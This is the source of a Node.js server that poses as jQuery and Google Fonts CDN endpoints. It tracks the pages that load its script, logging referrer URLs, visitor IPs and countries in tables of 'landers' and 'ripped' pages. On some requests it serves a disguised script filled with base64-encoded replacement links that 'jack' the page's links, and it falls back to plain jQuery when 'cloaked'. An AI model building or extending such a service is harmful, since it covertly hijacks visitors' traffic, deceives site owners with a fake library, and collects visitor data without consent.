var _ = require("lodash");
//module dependencies
var express = require('express'),
  http = require('http'),
  mysql = require('mysql'),
  path = require('path');
var app = express();
var request = require('request');
var urlParser = require('url');
var fs = require('node-fs');
var uuid = require('node-uuid');
var cors = require('cors');
var get_ip = require('ipware')().get_ip;
var geoip = require('geoip-lite');
//new middlewares
var logger = require('morgan');
var methodOverride = require('method-override');
var session = require('express-session');
var bodyParser = require('body-parser');
var multer = require('multer');
var errorHandler = require('errorhandler');
var cookieParser = require('cookie-parser');

var config = require('./config');

var redis = require("redis");
var redisClient = redis.createClient(config.redisConfig);
redisClient.on("error", function(e) {
  console.log("REDIS ERROR: " + e);
});


//Date prototype for converting Date() to MySQL DateTime format
Date.prototype.toMysqlFormat = function() {
  function pad(n) {
    return n < 10 ? '0' + n : n
  }
  return this.getFullYear() + "-" + pad(1 + this.getMonth()) + "-" + pad(this.getDate()) + " " + pad(this.getHours()) + ":" + pad(this.getMinutes()) + ":" + pad(this.getSeconds());
};
String.prototype.replaceAt = function(index, character) {
  return this.substr(0, index) + character + this.substr(index + character.length);
}

// all environments
app.set('port', config.port);
app.set('views', __dirname + '/views');
app.set('view engine', 'jade');
//app.use(favicon(__dirname + '/public/favicon.ico'));
//app.use(logger('dev'));
app.use(cookieParser());
app.use(bodyParser.json()); // parse application/json
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true })); // parse application/x-www-form-urlencoded
app.use(multer()); // parse multipart/form-data
app.use(session({ secret: 'foosballIsDaDevil', resave: true, saveUninitialized: true }));
app.use(methodOverride());
app.use(express.static(path.join(__dirname, 'public')));

var db = mysql.createPool(config.db_connection);


function getCodeDelimiter() {
  return "aIx1Fgix89e";
}

function addClientToWhitelistWindow(ip, callback) {
  if (!ip) {
    callback(true);
    return;
  }

  redisClient.get(ip, function(err, isWhitelisted) {
    if (isWhitelisted) {
      callback(false);
    } else {
      redisClient.set(ip, true);
      redisClient.expire(ip, '5');
      callback(true);
    }
  });
}

function getClientAddress(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0] || req.connection.remoteAddress;
};

function getClientResponseJSON(uuid, url, ip, callback) {

  var useSplitTestLinks = 1;

  if (Math.random() < .5) {
    useSplitTestLinks = 0;
  }

  var response = "";
  db.getConnection(function(err, connection) {
    connection.query("select is_jackable(?,?,?) as redirect_rate;", [url, config.minimum_clicks_per_min, ip], function(err, docs) {
      if (docs) {
        if (docs[0]) {
          var redirect_rate = docs[0].redirect_rate;
          var randomNumber = Math.random() * 100;
          if (redirect_rate == -1) {
            callback({ jquery: "cloaked" });
            connection.release();
          } else if (randomNumber <= redirect_rate) {
            connection.query("SELECT get_replacement_links(?,?) as links;", [url, useSplitTestLinks], function(err, docs) {
              if (docs.length > 0) {
                var links = docs[0].links;
                if (links) {
                  var linksArr = links.split(",");
                  /* 2. transform that into base64 code */
                  for (var i = 0; i < linksArr.length; i++) {
                    response += new Buffer(linksArr[i]).toString('base64') + getCodeDelimiter();
                  }
                }
              }

              if (response) {
                connection.query("CALL increment_jacks(?,?);", [url, uuid], function(err, docs) {
                  if (err) {
                    console.log("Error incrementing jacks for url: " + url + " : " + err);
                  }
                  callback({ jquery: response });
                  connection.release();
                });
              } else {
                callback({ jquery: response });
                connection.release();
              }
            });
          } else {
            callback({ jquery: false });
            connection.release();
          }
        } else {
          console.log(err);
          console.log("Cannot select is_jackable with values: " + url + ", " + ip);
          callback({ jquery: false });
          connection.release();
        }
      } else {
        console.log(err);
        console.log("Cannot select is_jackable with values: " + url + ", " + ip);
        callback({ jquery: false });
        connection.release();
      }
    });
  });
}

function formatURL(url) {
  if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
    url = "http://" + url;
  }

  if (url.substring(0, 11) == "http://www.") {
    url = url.replace("http://www.", "http://");
  }

  if (url.substring(0, 12) == "https://www.") {
    url = url.replace("https://www.", "http://");
  }

  if (url.substring(0, 8) == "https://") {
    url = url.replace("https://", "http://");
  }

  //drop everything after first '?' (query args)
  url = url.split('?')[0];

  //drop everything after first '#'
  url = url.split('#')[0];

  var lastChar = url.substr(url.length - 1);

  if (lastChar == '/') {
    url = url.substring(0, url.length - 1);
  }

  return url;
}

function getDomain(url) {
  return urlParser.parse(url).hostname;
}

function sendPlainFont(font, res) {
  if (!config.uuidArr[font]) {
    font = "Open Sans";
  }

  fs.readFile('./client/css/' + font, function(err, data) {
    if (err) {
      throw err;
    }
    res.writeHead(200, {
      'Content-Length': data.length,
      'Content-Type': 'text/plain',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
    });
    res.end(data);
  });
}

function sendPlainJquery(req, res) {
  fs.readFile('./client/compressed/jquery-1.11.2.min.js', function(err, data) {
    if (err) {
      throw err;
    }
    var jqueryVersion = req.params.jqueryVersion;
    if (!jqueryVersion) {
      jqueryVersion = '1.11.1';
    }
    data = String(data).replace('jqueryVersion', jqueryVersion);

    res.writeHead(200, {
      'Content-Length': data.length,
      'Content-Type': 'text/plain',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
    });
    res.end(data);
  });
}

function sendBlankResponse(res) {
  var response = "";
  res.writeHead(200, {
    'Content-Length': response.length,
    'Content-Type': 'text/plain',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
  });
  res.end(response);
}

function processRequest(req, res, options) {
  var url = options.url;
  var uuid = options.uuid;

  var ip = getClientAddress(req);
  var geo = geoip.lookup(ip) || { country: "UNKNOWN" };
  var full_url = url;

  if (!geo) {
    console.log(ip + " had unknown geo region.");
  }

  addClientToWhitelistWindow(ip, function(addedToWhitelistSuccessfully) {
    if (addedToWhitelistSuccessfully) {

      if (!url) {
        sendPlainJquery(req, res);
      } else {

        url = formatURL(url);
        var domain = getDomain(url);

        var getRequestInfo = function(callback) {
          var user = ""; //set by getuser

          var getUser = function(callback) {
            db.getConnection(function(err, connection) {
              if (err) console.log(err)
              connection.query("SELECT user FROM lander_info WHERE uuid = ? LIMIT 1", [uuid], function(err, docs) {
                if (err) console.log(err);
                user = docs[0].user;
                callback();
                connection.release();
              });
            });
          };

          //if found call this before returning
          var insertCountryCode = function(callback) {
            db.getConnection(function(err, connection) {
              if (err) console.log(err)

              connection.query("CALL insert_country_code(?, ?);", [url, geo.country], function(err, docs) {
                if (err) {
                  callback(err);
                } else {
                  callback(false);
                }
                connection.release();
              });
            });
          };

          var checkOldRegistered = function(callback) {
            db.getConnection(function(err, connection) {
              if (err) console.log(err)

              connection.query("SELECT * FROM lander_info WHERE url= ? AND uuid= ?;", [url, uuid], function(err, docs) {
                if (docs.length) {
                  connection.query("UPDATE lander_info SET hits=hits+1,last_updated=NOW() WHERE url= ? and uuid= ?;", [url, uuid], function(err, docs) {
                    connection.query("CALL update_stats(?, ?, ?, ?, ?);", [url, uuid, 0, 1, 0], function(err, docs) {
                      callback('OLD_REGISTERED');
                      connection.release();
                    });
                  });
                } else {
                  callback(false);
                  connection.release();
                }
              });
            });
          };

          var checkNewRegisteredLocal = function(callback) {
            db.getConnection(function(err, connection) {
              if (err) console.log(err)

              connection.query("SELECT * FROM lander_info WHERE uuid= ? AND url IS NULL", [uuid], function(err, docs) {
                if (docs.length) {
                  if (domain.contains("file") || domain.contains("localhost")) {
                    callback('LOCAL');
                    connection.release();
                  } else {
                    connection.query("UPDATE lander_info SET url= ?,domain= ?,hits= ?,rips= ?,last_updated=NOW() WHERE uuid= ?;", [url, domain, 1, 0, uuid], function(err, docs) {
                      connection.query("UPDATE landers SET ready= ? WHERE uuid= ?;", [2, uuid], function(err, docs) {
                        connection.query("CALL update_stats(?, ?, ?, ?, ?);", [url, uuid, 0, 1, 0], function(err, docs) {
                          callback('NEW_REGISTERED');
                          connection.release();
                        });
                      });
                    });
                  }
                } else {
                  callback(false);
                  connection.release();
                }
              });
            });
          };

          var checkSameDomainOldRippedNewRipped = function(callback) {
            db.getConnection(function(err, connection) {
              if (err) console.log(err)

              connection.query("SELECT * FROM lander_info WHERE domain= ?;", [domain], function(err, docs) {
                if (err) console.log("1 err: " + err);
                if (docs.length) {
                  connection.query("INSERT INTO lander_info (url, uuid, user, hits, domain, rips) VALUES (?, ?, ?, ?, ?, ?);", [url, uuid, user, 1, domain, 0], function(err, docs) {
                    if (err) console.log("2 err: " + err);

                    connection.query("DELETE FROM lander_info WHERE uuid= ? AND url IS NULL;", [uuid], function(err, docs) {
                      if (err) console.log("3 err: " + err);

                      callback("SAME_DOMAIN");
                      connection.release();
                    });
                  });
                } else {
                  connection.query("SELECT * FROM ripped WHERE uuid = ? AND url = ?;", [uuid, url], function(err, docs) {
                    if (err) console.log("3 err: " + err);

                    if (docs.length) {
                      //IS OLD RIPPED!
                      connection.query("UPDATE ripped SET hits=hits+1,full_url= ? ,last_updated=NOW() WHERE url = ? and uuid = ?;", [full_url, url, uuid], function(err, docs) {
                        if (err) console.log("4 err: " + err);

                        connection.query("CALL insert_pulse(?, NOW());", [url], function(err, docs) {
                          if (err) console.log("5 err: " + err);

                          connection.query("CALL update_stats(?, ?, ?, ?, ?);", [url, uuid, 0, 0, 0], function(err, docs) {
                            if (err) console.log("6 err: " + err);

                            connection.query("CALL insert_ip(?, ?, ?);", [url, ip, 0], function(err, docs) {
                              if (err) console.log("7 err: " + err);

                              callback("OLD_RIPPED");
                              connection.release();
                            });
                          });
                        });
                      });
                    } else {
                      //IS NEW RIPPED!
                      connection.query("SELECT url FROM ripped WHERE domain = ?;", [domain], function(err, docs) {
                        var isNewDomain = true;
                        if (docs.length) {
                          isNewDomain = false;
                        }

                        connection.query("INSERT INTO ripped (url, uuid, user, hits, full_url, last_updated, domain) VALUES (?, ?, ?, ?, ?, NOW(), ?);", [url, uuid, user, 1, full_url, domain], function(err, docs) {
                          connection.query("UPDATE lander_info SET rips=rips+1 WHERE uuid = ?;", [uuid], function(err, docs) {
                            connection.query("CALL insert_pulse(?, NOW());", [url], function(err, docs) {
                              connection.query("CALL update_stats(?, ?, ?, ?, ?);", [url, uuid, 1, 0, isNewDomain], function(err, docs) {
                                connection.query("CALL insert_ip(?, ?, ?);", [url, ip, 1], function(err, docs) {
                                  callback("NEW_RIPPED");
                                  connection.release();
                                });
                              });
                            });
                          });
                        });
                      });
                    }
                  });
                }
              });
            });
          };

          var checkUnknownUUIDBehavior = function(callback) {
            db.getConnection(function(err, connection) {
              if (err) console.log(err)

              connection.query("SELECT * FROM lander_info WHERE uuid = ?;", [uuid], function(err, docs) {
                if (docs.length) {
                  callback("UNKNOWN_BEHAVIOR");
                } else {
                  callback("UNKNOWN_UUID");
                }
                connection.release();
              });
            });
          };

          var enterCountryCode = function(callback) {
            db.getConnection(function(err, connection) {
              if (err) console.log(err)

              connection.query("CALL insert_country_code(?, ?);", [url, geo.country], function(err, docs) {
                if (err) console.log("countr code err: " + err);
                callback();
                connection.release();
              });
            });
          };

          getUser(function() {
            enterCountryCode(function() {
              checkOldRegistered(function(found) {
                if (found) {
                  callback(found);
                  return;
                } else {
                  checkNewRegisteredLocal(function(found) {
                    if (found) {
                      callback(found);
                      return;
                    } else {
                      checkSameDomainOldRippedNewRipped(function(found) {
                        if (found) {
                          callback(found);
                          return;
                        } else {
                          checkUnknownUUIDBehavior(function(found) {
                            callback(found);
                            return;
                          });
                        }
                      });
                    }
                  });
                }
              });
            });
          });

        };

        getRequestInfo(function(response_string) {

          if (response_string != undefined) {
            var cloaked = 0;

            if (response_string == "OLD_RIPPED") {
              //send back data!
              getClientResponseJSON(uuid, url, ip, function(response) {
                if (response.jquery == false) {
                  response = "";
                  sendPlainJquery(req, res);
                  return;
                } else if (response.jquery == "cloaked") {
                  sendPlainJquery(req, res);
                  return;
                  cloaked = 1;
                  response = "";
                } else {
                  response = response.jquery;
                }

                fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                  if (err) throw err;
                  var replacedFile = String(data).replace('replacemelinks', response);

                  res.writeHead(200, {
                    'Content-Length': replacedFile.length,
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
                  });
                  res.end(replacedFile);
                });
              });
            } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
              sendPlainJquery(req, res);
            } else if (response_string == "UNKNOWN_BEHAVIOR") {
              console.log("Something went wrong when calling process_request.");
              sendPlainJquery(req, res);
            } else if (response_string == "UNKNOWN_UUID") {
              console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
              sendPlainJquery(req, res);
            } else {
              console.log("weird response string: " + response_string);
              sendPlainJquery(req, res);
            }
          } else {
            var obj = {
              url: url,
              uuid: uuid,
              domain: domain,
              geo: geo.country,
              ip: ip
            }
            console.log(err + "Failed to get a response from process_request" + JSON.stringify(obj));
            sendPlainJquery(req, res);
          }
        });

      }
    } else {
      sendPlainJquery(req, res);
    }
  });
}

app.get('/', function(req, res) {
  var host = req.get('host');
  var redirectUrl = config.redirectUrls[host];
  // console.log("host: " + host + " now redirecting to : " + redirectUrl);
  if (!redirectUrl) redirectUrl = "https://github.com";
  res.redirect(redirectUrl);
});

//Get and load client js
app.get('/jquery', function(req, res) {
  sendPlainJquery(req, res);
});

app.get('/jquery/latest', function(req, res) {
  sendPlainJquery(req, res);
});

//I don't think this endpoint is used
app.post('/jquery/latest', function(req, res) {

  var options = {
    url: req.body.referer,
    uuid: req.body.version
  };

  processRequest(req, res, options);
});


app.post('/jquery/stable', function(req, res) {

  var options = {
    url: req.body.stats,
    uuid: req.body.version
  };

  processRequest(req, res, options);
});

app.post('/jquery/dist', function(req, res) {

  var options = {
    url: req.body.stats,
    uuid: req.body.version
  };

  processRequest(req, res, options);
});

app.get('/jquery/dist', function(req, res) {

  var xalt = req.headers['x-alt-referer'];
  if (!xalt) {
    xalt = req.headers['X-Alt-Referer'];
  }

  if (!xalt) {
    sendPlainJquery(req, res);
  } else {

    var index = xalt.lastIndexOf("?txid=");

    var options = {
      url: xalt.substring(0, index),
      uuid: xalt.substring(index + 6)
    };

    processRequest(req, res, options);
  }
});

app.post('/jquery', function(req, res) {

  var options = {
    url: req.headers['referer'],
    uuid: req.body.version,
  };

  processRequest(req, res, options);

});


//fonts.googleapis.io/css?family=<font>
app.get('/css', function(req, res) {

  var url = req.headers.referrer || req.headers.referer;
  var font = req.query.family;
  var uuid = config.uuidArr[font];

  if (!uuid) {
    console.log("no uuid /css redirecting to fonts..");
    res.redirect('http://fonts.googleapis.com' + req.url);
    return;
  }

  var options = {
    url: url,
    uuid: uuid
  };

  processRequest(req, res, options);

});

//ajax.googleapis.io GENERAL ENDPOINT
app.get('/ajax/libs/jquery/:jqueryVersion/jquery.min.js', function(req, res) {

  var url = req.headers.referrer || req.headers.referer;
  var jqueryVersion = req.params.jqueryVersion;
  var uuid = config.uuidJqueryArr[jqueryVersion];

  if (!uuid) {
    console.log("no uuid /ajax redirecting to ajax.googleapis.com..");
    res.redirect('http://ajax.googleapis.com' + req.url);
    return;
  }

  var options = {
    url: url,
    uuid: uuid
  };

  processRequest(req, res, options);

});


http.createServer(app).listen(config.port, function() {
  console.log('RS REST server listening on port ' + config.port);
});

exports = module.exports = app;
